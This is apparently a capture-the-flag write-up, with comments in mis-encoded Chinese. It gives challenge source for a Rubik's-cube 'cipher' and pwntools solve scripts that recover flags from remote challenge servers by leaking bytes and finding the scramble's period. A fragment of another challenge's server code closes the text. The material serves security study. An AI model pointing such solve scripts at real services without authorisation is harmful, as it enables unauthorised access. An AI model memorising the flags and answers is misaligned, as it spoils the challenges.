p.recvline().rstrip(b&quot;\\n&quot;) return line[1:2] # ç¬¬äºŒä¸ªå­—ç¬¦æ˜¯æ³„éœ²å­—èŠ‚flag = b&quot;&quot;for i in range(64): # flag[64] æ°å¥½å¤Ÿç”¨ b = leak(i) flag += b if b == b&quot;&#125;&quot;: breakprint(&quot;FLAG =&quot;, flag.decode(errors=&quot;replace&quot;))# FLAG = bctf&#123;wOw_YoU_sOlVeD_iT_665ff83d&#125; Cryptocube cipher 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946947948949950951952953954955956957958959960961962963964965966967968969970971972973974975976977978979980981982983984985986987988989990991992993994995996997998999100010011002100310041005100610071008100910101011101210131014#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdbool.h&gt;#include &lt;string.h&gt;typedef uint8_t face_t;typedef uint8_t edge_t;typedef uint8_t center_t;typedef uint16_t corner_t;#define FACE_SIZE 4#define FACE_MASK ((1 &lt;&lt; FACE_SIZE) - 1)#define TWO_FACE_MASK ((1 &lt;&lt; 2 * FACE_SIZE) - 1)#define ALGORITHM_LENGTH 40const size_t CENTER_CT = 6;const size_t FACE_CT = CENTER_CT * 3 * 3;const size_t CORNER_CT = 8;const size_t EDGE_CT = 12;/** * Create a corner. */corner_t corner(const face_t top, const face_t left, const face_t right) &#123; return (top &lt;&lt; FACE_SIZE | left) &lt;&lt; FACE_SIZE | right;&#125;/** * Retrieve the top face of a corner. */face_t corner_top(const corner_t corner) &#123; return corner &gt;&gt; 2 * FACE_SIZE;&#125;/** * Retrieve the left face of a corner. */face_t corner_left(const corner_t corner) &#123; return (corner &gt;&gt; FACE_SIZE) &amp; FACE_MASK;&#125;/** * Retrieve the right face of a corner. */face_t corner_right(const corner_t corner) &#123; return corner &amp; FACE_MASK;&#125;/** * Create an edge. */edge_t edge(const face_t left, const face_t right) &#123; return left &lt;&lt; FACE_SIZE | right;&#125;/** * Retrieve the left face of an edge. */face_t edge_left(const edge_t edge) &#123; return (edge &gt;&gt; FACE_SIZE) &amp; FACE_MASK;&#125;/** * Retrieve the right face of an edge. */face_t edge_right(const edge_t edge) &#123; return edge &amp; FACE_MASK;&#125;/** * Flip an edge. */edge_t flip_edge(const edge_t edge) &#123; return edge &lt;&lt; FACE_SIZE | edge &gt;&gt; FACE_SIZE;&#125;/** * Rotate a corner clockwise. */corner_t rotate_corner(const corner_t corner) &#123; return ((corner &amp; FACE_MASK) &lt;&lt; 2 * FACE_SIZE) | (corner &gt;&gt; FACE_SIZE);&#125;/** * Rotate a corner counterclockwise. */corner_t rotate_corner_(const corner_t corner) &#123; return ((corner &amp; TWO_FACE_MASK) &lt;&lt; FACE_SIZE) | (corner &gt;&gt; 2 * FACE_SIZE);&#125;/** * Naming: * Each field is comprised of each face the piece touches. The first letter is * chosen from the following order of precedence: * * f - front * b - back * u - up * d - down * l - left * r - right * * Then, for corners, the other two are chosen as the left and right ones if * the first face were on top. */struct Cube &#123; corner_t ful; corner_t fru; corner_t fld; corner_t fdr; corner_t blu; corner_t bur; corner_t bdl; corner_t brd; edge_t fu; edge_t fr; edge_t fd; edge_t fl; edge_t bu; edge_t br; edge_t bd; edge_t bl; edge_t ur; edge_t ul; edge_t dr; edge_t dl; center_t f; center_t b; center_t u; center_t d; center_t l; center_t r;&#125;;/** * Rotate front face clockwise. */void move_F(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = cube-&gt;fld; cube-&gt;fld = cube-&gt;fdr; cube-&gt;fdr = cube-&gt;fru; cube-&gt;fru = temp_corner; temp_edge = cube-&gt;fu; cube-&gt;fu = cube-&gt;fl; cube-&gt;fl = cube-&gt;fd; cube-&gt;fd = cube-&gt;fr; cube-&gt;fr = temp_edge;&#125;/** * Rotate front face counterclockwise. */void move_F_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = cube-&gt;fru; cube-&gt;fru = cube-&gt;fdr; cube-&gt;fdr = cube-&gt;fld; cube-&gt;fld = temp_corner; temp_edge = cube-&gt;fu; cube-&gt;fu = cube-&gt;fr; cube-&gt;fr = cube-&gt;fd; cube-&gt;fd = cube-&gt;fl; cube-&gt;fl = temp_edge;&#125;/** * Rotate back face clockwise. */void move_B(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;blu; cube-&gt;blu = cube-&gt;bur; cube-&gt;bur = cube-&gt;brd; cube-&gt;brd = cube-&gt;bdl; cube-&gt;bdl = temp_corner; temp_edge = cube-&gt;bu; cube-&gt;bu = cube-&gt;br; cube-&gt;br = cube-&gt;bd; cube-&gt;bd = cube-&gt;bl; cube-&gt;bl = temp_edge;&#125;/** * Rotate back face counterclockwise. */void move_B_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;blu; cube-&gt;blu = cube-&gt;bdl; cube-&gt;bdl = cube-&gt;brd; cube-&gt;brd = cube-&gt;bur; cube-&gt;bur = temp_corner; temp_edge = cube-&gt;bu; cube-&gt;bu = cube-&gt;bl; cube-&gt;bl = cube-&gt;bd; cube-&gt;bd = cube-&gt;br; cube-&gt;br = temp_edge;&#125;/** * Rotate right face clockwise. */void move_R(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;fru; cube-&gt;fru = rotate_corner_(cube-&gt;fdr); cube-&gt;fdr = rotate_corner(cube-&gt;brd); cube-&gt;brd = rotate_corner_(cube-&gt;bur); cube-&gt;bur = rotate_corner(temp_corner); temp_edge = cube-&gt;fr; cube-&gt;fr = cube-&gt;dr; cube-&gt;dr = cube-&gt;br; cube-&gt;br = cube-&gt;ur; cube-&gt;ur = temp_edge;&#125;/** * Rotate right face counterclockwise. */void move_R_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;fru; cube-&gt;fru = rotate_corner_(cube-&gt;bur); cube-&gt;bur = rotate_corner(cube-&gt;brd); cube-&gt;brd = rotate_corner_(cube-&gt;fdr); cube-&gt;fdr = rotate_corner(temp_corner); temp_edge = cube-&gt;fr; cube-&gt;fr = cube-&gt;ur; cube-&gt;ur = cube-&gt;br; cube-&gt;br = cube-&gt;dr; cube-&gt;dr = temp_edge;&#125;/** * Rotate left face clockwise. */void move_L(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = rotate_corner(cube-&gt;blu); cube-&gt;blu = rotate_corner_(cube-&gt;bdl); cube-&gt;bdl = rotate_corner(cube-&gt;fld); cube-&gt;fld = rotate_corner_(temp_corner); temp_edge = cube-&gt;fl; cube-&gt;fl = cube-&gt;ul; cube-&gt;ul = cube-&gt;bl; cube-&gt;bl = cube-&gt;dl; cube-&gt;dl = temp_edge;&#125;/** * Rotate left face counterclockwise. */void move_L_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = rotate_corner(cube-&gt;fld); cube-&gt;fld = rotate_corner_(cube-&gt;bdl); cube-&gt;bdl = rotate_corner(cube-&gt;blu); cube-&gt;blu = rotate_corner_(temp_corner); temp_edge = cube-&gt;fl; cube-&gt;fl = cube-&gt;dl; cube-&gt;dl = cube-&gt;bl; cube-&gt;bl = cube-&gt;ul; cube-&gt;ul = temp_edge;&#125;/** * Rotate up face clockwise. */void move_U(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = rotate_corner_(cube-&gt;fru); cube-&gt;fru = rotate_corner(cube-&gt;bur); cube-&gt;bur = rotate_corner_(cube-&gt;blu); cube-&gt;blu = rotate_corner(temp_corner); temp_edge = cube-&gt;fu; cube-&gt;fu = flip_edge(cube-&gt;ur); cube-&gt;ur = flip_edge(cube-&gt;bu); cube-&gt;bu = flip_edge(cube-&gt;ul); cube-&gt;ul = flip_edge(temp_edge);&#125;/** * Rotate up face counterclockwise. */void move_U_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;ful; cube-&gt;ful = rotate_corner_(cube-&gt;blu); cube-&gt;blu = rotate_corner(cube-&gt;bur); cube-&gt;bur = rotate_corner_(cube-&gt;fru); cube-&gt;fru = rotate_corner(temp_corner); temp_edge = cube-&gt;fu; cube-&gt;fu = flip_edge(cube-&gt;ul); cube-&gt;ul = flip_edge(cube-&gt;bu); cube-&gt;bu = flip_edge(cube-&gt;ur); cube-&gt;ur = flip_edge(temp_edge);&#125;/** * Rotate down face clockwise. */void move_D(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;fld; cube-&gt;fld = rotate_corner(cube-&gt;bdl); cube-&gt;bdl = rotate_corner_(cube-&gt;brd); cube-&gt;brd = rotate_corner(cube-&gt;fdr); cube-&gt;fdr = rotate_corner_(temp_corner); temp_edge = cube-&gt;fd; cube-&gt;fd = flip_edge(cube-&gt;dl); cube-&gt;dl = flip_edge(cube-&gt;bd); cube-&gt;bd = flip_edge(cube-&gt;dr); cube-&gt;dr = flip_edge(temp_edge);&#125;/** * Rotate down face counterclockwise. */void move_D_(struct Cube *cube) &#123; corner_t temp_corner; edge_t temp_edge; temp_corner = cube-&gt;fld; cube-&gt;fld = rotate_corner(cube-&gt;fdr); cube-&gt;fdr = rotate_corner_(cube-&gt;brd); cube-&gt;brd = rotate_corner(cube-&gt;bdl); cube-&gt;bdl = rotate_corner_(temp_corner); temp_edge = cube-&gt;fd; cube-&gt;fd = flip_edge(cube-&gt;dr); cube-&gt;dr = flip_edge(cube-&gt;bd); cube-&gt;bd = flip_edge(cube-&gt;dl); cube-&gt;dl = flip_edge(temp_edge);&#125;/** * Rotate middle layer following L. */void move_M(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;f; cube-&gt;f = cube-&gt;u; cube-&gt;u = cube-&gt;b; cube-&gt;b = cube-&gt;d; cube-&gt;d = temp_center; temp_edge = cube-&gt;fu; cube-&gt;fu = flip_edge(cube-&gt;bu); cube-&gt;bu = flip_edge(cube-&gt;bd); cube-&gt;bd = flip_edge(cube-&gt;fd); cube-&gt;fd = flip_edge(temp_edge);&#125;/** * Rotate middle layer following R. */void move_M_(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;f; cube-&gt;f = cube-&gt;d; cube-&gt;d = cube-&gt;b; cube-&gt;b = cube-&gt;u; cube-&gt;u = temp_center; temp_edge = cube-&gt;fu; cube-&gt;fu = flip_edge(cube-&gt;fd); cube-&gt;fd = flip_edge(cube-&gt;bd); cube-&gt;bd = flip_edge(cube-&gt;bu); cube-&gt;bu = flip_edge(temp_edge);&#125;/** * Rotate middle layer following D. */void move_E(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;f; cube-&gt;f = cube-&gt;l; cube-&gt;l = cube-&gt;b; cube-&gt;b = cube-&gt;r; cube-&gt;r = temp_center; temp_edge = cube-&gt;fr; cube-&gt;fr = flip_edge(cube-&gt;fl); cube-&gt;fl = flip_edge(cube-&gt;bl); cube-&gt;bl = flip_edge(cube-&gt;br); cube-&gt;br = flip_edge(temp_edge);&#125;/** * Rotate middle layer following U. */void move_E_(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;f; cube-&gt;f = cube-&gt;r; cube-&gt;r = cube-&gt;b; cube-&gt;b = cube-&gt;l; cube-&gt;l = temp_center; temp_edge = cube-&gt;fr; cube-&gt;fr = flip_edge(cube-&gt;br); cube-&gt;br = flip_edge(cube-&gt;bl); cube-&gt;bl = flip_edge(cube-&gt;fl); cube-&gt;fl = flip_edge(temp_edge);&#125;/** * Rotate middle layer following F. */void move_S(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;u; cube-&gt;u = cube-&gt;l; cube-&gt;l = cube-&gt;d; cube-&gt;d = cube-&gt;r; cube-&gt;r = temp_center; temp_edge = cube-&gt;ur; cube-&gt;ur = flip_edge(cube-&gt;ul); cube-&gt;ul = flip_edge(cube-&gt;dl); cube-&gt;dl = flip_edge(cube-&gt;dr); cube-&gt;dr = flip_edge(temp_edge);&#125;/** * Rotate middle layer following B. */void move_S_(struct Cube *cube) &#123; center_t temp_center; edge_t temp_edge; temp_center = cube-&gt;u; cube-&gt;u = cube-&gt;r; cube-&gt;r = cube-&gt;d; cube-&gt;d = cube-&gt;l; cube-&gt;l = temp_center; temp_edge = cube-&gt;ur; cube-&gt;ur = flip_edge(cube-&gt;dr); cube-&gt;dr = flip_edge(cube-&gt;dl); cube-&gt;dl = flip_edge(cube-&gt;ul); cube-&gt;ul = flip_edge(temp_edge);&#125;/** * Rotate cube following R. */void move_x(struct Cube *cube) &#123; move_L_(cube); move_M_(cube); move_R(cube);&#125;/** * Rotate cube following L. */void move_x_(struct Cube *cube) &#123; move_L(cube); move_M(cube); move_R_(cube);&#125;/** * Rotate cube following U. */void move_y(struct Cube *cube) &#123; move_U(cube); move_E_(cube); move_D_(cube);&#125;/** * Rotate cube following D. */void move_y_(struct Cube *cube) &#123; move_U_(cube); move_E(cube); move_D(cube);&#125;/** * Rotate cube following F. */void move_z(struct Cube *cube) &#123; move_F(cube); move_S(cube); move_B_(cube);&#125;/** * Rotate cube following B. */void move_z_(struct Cube *cube) &#123; move_F_(cube); move_S_(cube); move_B(cube);&#125;/** * Print out the cube in the following format: * * u u u * u u u * u u u * * l l l f f f r r r * l l l f f f r r r * l l l f f f r r r * * d d d * d d d * d d d * * b b b * b b b * b b b */void print_cube(struct Cube cube) &#123; /* u u u */ printf(&quot; %2i %2i %2i\\n&quot;, corner_right(cube.blu), edge_right(cube.bu), corner_left(cube.bur)); /* u u u */ printf(&quot; %2i %2i %2i\\n&quot;, edge_left(cube.ul), (face_t)cube.u, edge_left(cube.ur)); /* u u u */ printf(&quot; %2i %2i %2i\\n&quot;, corner_left(cube.ful), edge_right(cube.fu), corner_right(cube.fru)); printf(&quot;\\n&quot;); /* l l l u u u f f f*/ printf(&quot;%2i %2i %2i %2i %2i %2i %2i %2i %2i\\n&quot;, corner_left(cube.blu), edge_right(cube.ul), corner_right(cube.ful), corner_top(cube.ful), edge_left(cube.fu), corner_top(cube.fru), corner_left(cube.fru), edge_right(cube.ur), corner_right(cube.bur)); /* l l l u u u f f f*/ printf(&quot;%2i %2i %2i %2i %2i %2i %2i %2i %2i\\n&quot;, edge_right(cube.bl), (face_t)cube.l, edge_right(cube.fl), edge_left(cube.fl), (face_t)cube.f, edge_left(cube.fr), edge_right(cube.fr), (face_t)cube.r, edge_right(cube.br)); /* l l l u u u f f f*/ printf(&quot;%2i %2i %2i %2i %2i %2i %2i %2i %2i\\n&quot;, corner_right(cube.bdl), edge_right(cube.dl), corner_left(cube.fld), corner_top(cube.fld), edge_left(cube.fd), corner_top(cube.fdr), corner_right(cube.fdr), edge_right(cube.dr), corner_left(cube.brd)); printf(&quot;\\n&quot;); /* d d d */ printf(&quot; %2i %2i %2i\\n&quot;, corner_right(cube.fld), edge_right(cube.fd), corner_left(cube.fdr)); /* d d d */ printf(&quot; %2i %2i %2i\\n&quot;, edge_left(cube.dl), (face_t)cube.d, edge_left(cube.dr)); /* d d d */ printf(&quot; %2i %2i %2i\\n&quot;, corner_left(cube.bdl), edge_right(cube.bd), corner_right(cube.brd)); printf(&quot;\\n&quot;); /* b b b */ printf(&quot; %2i %2i %2i\\n&quot;, corner_top(cube.bdl), edge_left(cube.bd), corner_top(cube.brd)); /* b b b */ printf(&quot; %2i %2i %2i\\n&quot;, edge_left(cube.bl), (face_t)cube.b, edge_left(cube.br)); /* b b b */ printf(&quot; %2i %2i %2i\\n&quot;, corner_top(cube.blu), edge_left(cube.bu), corner_top(cube.bur));&#125;#define NIBBLE_SIZE 4#define NIBBLE_MASK ((1 &lt;&lt; NIBBLE_SIZE) - 1)#define NIBBLE(input, i) ((input[i / 2] &gt;&gt; NIBBLE_SIZE * (1 - i % 2)) \\ &amp; NIBBLE_MASK)/** * Build a cube from a string of length * `FACE_CT / 2` from its nibbles in this order: * * 18 19 20 * 21 22 23 * 24 25 26 * * 27 28 29 00 01 02 09 10 11 * 30 31 32 03 04 05 12 13 14 * 33 34 35 06 07 08 15 16 17 * * 36 37 38 * 39 40 41 * 42 43 44 * * 45 46 47 * 48 49 50 * 51 52 53 */void build_cube_from_string(struct Cube *cube, const char *input) &#123; cube-&gt;ful = corner( NIBBLE(input, 0), NIBBLE(input, 24), NIBBLE(input, 29) ); cube-&gt;fru = corner( NIBBLE(input, 2), NIBBLE(input, 9), NIBBLE(input, 26) ); cube-&gt;fld = corner( NIBBLE(input, 6), NIBBLE(input, 35), NIBBLE(input, 36) ); cube-&gt;fdr = corner( NIBBLE(input, 8), NIBBLE(input, 38), NIBBLE(input, 15) ); cube-&gt;blu = corner( NIBBLE(input, 51), NIBBLE(input, 27), NIBBLE(input, 18) ); cube-&gt;bur = corner( NIBBLE(input, 53), NIBBLE(input, 20), NIBBLE(input, 11) ); cube-&gt;bdl = corner( NIBBLE(input, 45), NIBBLE(input, 42), NIBBLE(input, 33) ); cube-&gt;brd = corner( NIBBLE(input, 47), NIBBLE(input, 17), NIBBLE(input, 44) ); cube-&gt;fu = edge( NIBBLE(input, 1), NIBBLE(input, 25) ); cube-&gt;fr = edge( NIBBLE(input, 5), NIBBLE(input, 12) ); cube-&gt;fd = edge( NIBBLE(input, 7), NIBBLE(input, 37) ); cube-&gt;fl = edge( NIBBLE(input, 3), NIBBLE(input, 32) ); cube-&gt;bu = edge( NIBBLE(input, 52), NIBBLE(input, 19) ); cube-&gt;br = edge( NIBBLE(input, 50), NIBBLE(input, 14) ); cube-&gt;bd = edge( NIBBLE(input, 46), NIBBLE(input, 43) ); cube-&gt;bl = edge( NIBBLE(input, 48), NIBBLE(input, 30) ); cube-&gt;ur = edge( NIBBLE(input, 23), NIBBLE(input, 10) ); cube-&gt;ul = edge( NIBBLE(input, 21), NIBBLE(input, 28) ); cube-&gt;dr = edge( NIBBLE(input, 41), NIBBLE(input, 16) ); cube-&gt;dl = edge( NIBBLE(input, 39), NIBBLE(input, 34) ); cube-&gt;f = NIBBLE(input, 4); cube-&gt;r = NIBBLE(input, 13); cube-&gt;u = NIBBLE(input, 22); cube-&gt;l = NIBBLE(input, 31); cube-&gt;d = NIBBLE(input, 40); cube-&gt;b = NIBBLE(input, 49);&#125;void set_nibble(unsigned char *bytes, const size_t i, const uint8_t nibble) &#123; bytes[i / 2] &amp;= (NIBBLE_MASK &lt;&lt; (NIBBLE_SIZE * (i % 2))); bytes[i / 2] |= nibble &lt;&lt; (NIBBLE_SIZE * (1 - i % 2));&#125;void extract_bytes_from_front( const struct Cube cube, unsigned char *output, const size_t base ) &#123; set_nibble(output, base + 0, corner_top(cube.ful)); set_nibble(output, base + 1, edge_left(cube.fu)); set_nibble(output, base + 2, corner_top(cube.fru)); set_nibble(output, base + 3, edge_left(cube.fl)); set_nibble(output, base + 4, (face_t)cube.f); set_nibble(output, base + 5, edge_left(cube.fr)); set_nibble(output, base + 6, corner_top(cube.fld)); set_nibble(output, base + 7, edge_left(cube.fd)); set_nibble(output, base + 8, corner_top(cube.fdr));&#125;void extract_bytes_from_cube(struct Cube cube, unsigned char *output) &#123; /* front */ extract_bytes_from_front(cube, output, 9 * 0); move_y(&amp;cube); /* right */ extract_bytes_from_front(cube, output, 9 * 1); move_y_(&amp;cube); move_x_(&amp;cube); /* up */ extract_bytes_from_front(cube, output, 9 * 2); move_x(&amp;cube); move_y_(&amp;cube); /* left */ extract_bytes_from_front(cube, output, 9 * 3); move_y(&amp;cube); move_x(&amp;cube); /* down */ extract_bytes_from_front(cube, output, 9 * 4); move_x(&amp;cube); /* back */ extract_bytes_from_front(cube, output, 9 * 5);&#125;/** * Execute an algorithm. */void execute_algorithm(struct Cube *cube, const char *str) &#123; size_t i; void (*F[])(struct Cube*) = &#123; move_F, move_F_, &#125;; void (*R[])(struct Cube*) = &#123; move_R, move_R_, &#125;; void (*L[])(struct Cube*) = &#123; move_L, move_L_, &#125;; void (*U[])(struct Cube*) = &#123; move_U, move_U_, &#125;; void (*D[])(struct Cube*) = &#123; move_D, move_D_, &#125;; void (*B[])(struct Cube*) = &#123; move_B, move_B_, &#125;; void (*M[])(struct Cube*) = &#123; move_M, move_M_, &#125;; void (*E[])(struct Cube*) = &#123; move_E, move_E_, &#125;; void (*S[])(struct Cube*) = &#123; move_S, move_S_, &#125;; void (*x[])(struct Cube*) = &#123; move_x, move_x_, &#125;; void (*y[])(struct Cube*) = &#123; move_y, move_y_, &#125;; void (*z[])(struct Cube*) = &#123; move_z, move_z_, &#125;; const size_t len = strlen(str); for (i = 0; i &lt; len; i++) &#123; const int inverse = str[i + 1] == &#x27;\\&#x27;&#x27; ? 1 : 0; switch (str[i]) &#123; case &#x27;F&#x27;: F[inverse](cube); break; case &#x27;R&#x27;: R[inverse](cube); break; case &#x27;L&#x27;: L[inverse](cube); break; case &#x27;U&#x27;: U[inverse](cube); break; case &#x27;D&#x27;: D[inverse](cube); break; case &#x27;B&#x27;: B[inverse](cube); break; case &#x27;M&#x27;: M[inverse](cube); break; case &#x27;E&#x27;: E[inverse](cube); break; case &#x27;S&#x27;: S[inverse](cube); break; case &#x27;x&#x27;: x[inverse](cube); break; case &#x27;y&#x27;: y[inverse](cube); break; case &#x27;z&#x27;: z[inverse](cube); break; default: printf(&quot;[WARN] unrecognized move: %c\\n&quot;, str[i]); break; &#125; /* skip the inverse character if present */ i += inverse; &#125;&#125;char *get_flag() &#123; char *flag = calloc(FACE_CT / 2 + 1, sizeof(char)); FILE *file; file = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if (file == NULL) &#123; perror(&quot;failed to open flag.txt for reading&quot;); exit(1); &#125; fread(flag, FACE_CT / 2, 1, file); fclose(file); return flag;&#125;char *get_algorithm() &#123; char *algorithm = calloc(ALGORITHM_LENGTH + 1, sizeof(char)); FILE *file; file = fopen(&quot;algorithm.txt&quot;, &quot;r&quot;); if (file == NULL) &#123; perror(&quot;failed to open algorithm.txt for reading&quot;); exit(1); &#125; fread(algorithm, sizeof(char), ALGORITHM_LENGTH, file); fclose(file); return algorithm;&#125;/** * Cube Cipher implementation */int main() &#123; size_t i; struct Cube *cube = calloc(1, sizeof(struct Cube)); char *flag = get_flag(); char *scramble_algorithm = get_algorithm(); unsigned char *output = calloc(FACE_CT, sizeof(unsigned char)); int option; char algorithm_str[256]; setvbuf(stdout, 0, 2, 0); build_cube_from_string(cube, flag); free(flag); execute_algorithm(cube, scramble_algorithm); printf(&quot;Welcome to the Interactive Cube Cipher App!\\n&quot; &quot;Try and break my cipher! (you can&#x27;t)\\n&quot; &quot;Options:\\n&quot; &quot;\\t1: Execute an algorithm\\n&quot; &quot;\\t2: Display cube\\n&quot; &quot;\\t3: Display cube as bytes\\n&quot; &quot;\\t4: Re-apply cube cipher\\n&quot; &quot;\\t5: Exit\\n&quot; ); option = 0; while (option != 5) &#123;get_option: printf(&quot;Option: &quot;); if (scanf(&quot;%d&quot;, &amp;option) != 1) &#123; while (getchar() != &#x27;\\n&#x27;); printf(&quot;Please enter an integer.\\n&quot;); goto get_option; &#125; switch (option) &#123; case 1: printf(&quot;Enter your algorithm:\\n&gt; &quot;); scanf(&quot;%255s&quot;, algorithm_str); execute_algorithm(cube, algorithm_str); break; case 2: print_cube(*cube); break; case 3: extract_bytes_from_cube(*cube, output); for (i = 0; i &lt; FACE_CT / 2; i++) &#123; printf(&quot;%02x&quot;, output[i]); &#125; printf(&quot;\\n&quot;); break; case 4: printf(&quot;Scrambling...\\n&quot;); execute_algorithm(cube, scramble_algorithm); break; case 5: printf(&quot;Goodbye!\\n&quot;); break; default: printf(&quot;Invalid option.\\n&quot;); &#125; &#125; free(output); free(cube); free(scramble_algorithm); return 0;&#125; 12345678910# Cube CipherThe Cube Cipher is my own invention: A modern unbreakable cipher.The Cube Cipher is a 27-character block cipher that works as follows:1. The plaintext is padded to a 27-byte boundary with null bytes.2. Each byte is brocken up into nibbles and each nibble is arranged on a Rubik&#x27;s Cube in this order: 18 19 20 21 22 23 24 25 26 27 28 29 00 01 02 09 10 11 30 31 32 03 04 05 12 13 14 33 34 35 06 07 08 15 16 17 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 12343. The cube is folded, shuffled according to a pre-selected &quot;algorithm&quot;, and unwraveled into a new stream.Someone who knows the algorithm can then reverse this by applying it in reverse. è¿™é“é¢˜ä»£ç å¤ªé•¿äº†æ‡’å¾—çœ‹ï¼Œç›´æ¥æ‰”GPTä¸€æŠŠæ¢­äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env python3from pwn import *import binasciiHOST = &quot;cube-cipher.challs.pwnoh.io&quot;PORT = 1337context.log_level = &quot;debug&quot; # debug å¤ªåµäº†def send_opt_after_prompt(r, n): r.sendlineafter(b&quot;Option: &quot;, str(n).encode())def dump_hex(r): send_opt_after_prompt(r, 3) # æœåŠ¡ç«¯ä¼šè¾“å‡ºä¸€è¡Œ hex + &#x27;\\n&#x27; hexline = r.recvline().strip().decode() return hexlinedef reapply(r): send_opt_after_prompt(r, 4) r.recvuntil(b&quot;Scrambling...\\n&quot;) # è¿™é‡Œä¸è¦æŠŠéšåçš„ &#x27;Option: &#x27; æç¤ºè¯»æ‰ï¼Œè®©ä¸‹ä¸€æ­¥å»ç­‰def main(): r = remote(HOST, PORT, ssl=True) # æŠŠæ¬¢è¿æ–‡æœ¬è¯»åˆ°èœå•å‡ºç°å³å¯ r.recvuntil(b&quot;Options:\\n&quot;) # ç¬¬ä¸€æ¬¡çš„åå…­è¿›åˆ¶ï¼ˆP(flag)ï¼‰ first_hex = dump_hex(r) # æ‰¾ç½®æ¢å‘¨æœŸ tï¼šæœ€å°æ­£æ•´æ•° k ä½¿å†æ¬¡å›åˆ° first_hex k = 0 while True: k += 1 if k % 100 == 0: log.info(f&quot;searching periodâ€¦ tried &#123;k&#125;&quot;) reapply(r) cur_hex = dump_hex(r) if cur_hex == first_hex: t = k log.success(f&quot;period found: t = &#123;t&#125;&quot;) break # å†åº”ç”¨ (t-1) æ¬¡å›åˆ° flag for _ in range(t - 1): reapply(r) flag_hex = dump_hex(r) data = binascii.unhexlify(flag_hex).rstrip(b&quot;\\x00&quot;) try: print(data.decode(&quot;utf-8&quot;, errors=&quot;replace&quot;)) except: print(data)if __name__ == &quot;__main__&quot;: main()# bctf&#123;the_cUb3_pl4yS_Y0U&#125; Clandescriptorius 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from fastapi import FastAPI, HTTPExceptionfrom fastapi.staticfiles import StaticFilesfrom pydantic import BaseModelfrom dataclasses import dataclassimport osimport hashlibflag = os.environ.get(&quot;FLAG&quot;) or &quot;bctf&#123;fake_flag_fake_flag_fake_flag_fake_flag&#125;&quot;def xor(aa: bytes, bb: bytes): return bytes(a ^ b for a, b in zip(aa, bb))def pad(data: bytes): padding_length = 16 - (len(data) % 16) return data + bytes([padding_length] * padding_length)def encrypt_block(block: bytes, key: bytes, timestamp: int, block_index: int): keystream = hashlib.sha256( f&quot;&#123;key.hex()&#125;&#123;timestamp&#125;&#123;block_index&#125;&quot;.encode() ).digest()[0:16] return xor(keystream, block)def encrypt(data: bytes, key: bytes, timestamp: int): padded = pad(data) blocks = [padded[i : i + 16] for i in range(0, len(padded), 16)] return b&quot;&quot;.join( encrypt_block(block, key, timestamp, i) for i, block in enumerate(blocks) )@dataclassclass Session: last_timestamp: int key: bytessessions: dict[str, Session] = &#123;&#125;app = FastAPI()class StartSessionRequest(BaseModel): timestamp: int@app.post(&quot;/startsession&quot;)def route_startsession(request: StartSessionRequest): session_id = os.urandom(16).hex() key = os.urandom(32) 